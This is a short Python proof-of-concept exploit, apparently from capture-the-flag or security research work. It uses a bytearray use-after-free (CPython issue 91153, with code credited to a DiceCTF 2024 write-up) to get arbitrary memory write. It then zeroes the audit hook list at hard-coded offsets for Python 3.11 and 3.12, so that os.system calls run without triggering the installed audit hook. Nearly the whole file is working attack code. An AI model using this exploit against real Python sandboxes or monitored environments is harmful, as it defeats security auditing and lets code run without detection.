#!audit_hook_head_finder

### POC2-issue91153-native.py
### use ctypes to get the addr and smash it with issues/91153

from audit_hook_head_finder import add_audit
import ctypes

add_audit()

obj = ctypes.byref(ctypes.py_object(()))

ctypes._os.system("echo 'test audit hook -- this will trigger hook'")

# following arbitery reading/writing exploit code from https://maplebacon.org/2024/02/dicectf2024-irs/
# improved by Maple Bacon
class UAF:
    def __index__(self):
        global memory
        uaf.clear()
        memory = bytearray()
        uaf.extend([0] * 56)
        return 1

uaf = bytearray(56)
uaf[23] = UAF()
# end of arbitery writing exploit code

for i in range(0, 8):
    # the offsets are from POC-native.py: 
    # Python 3.11 = -0xe388
    # Python 3.12 = -0x11df0
    memory[ctypes.cast(obj, ctypes.POINTER(ctypes.c_uint64)).contents.value -0x11df0 + i] = 0

ctypes._os.system("echo 'test audit hook -- this will not'")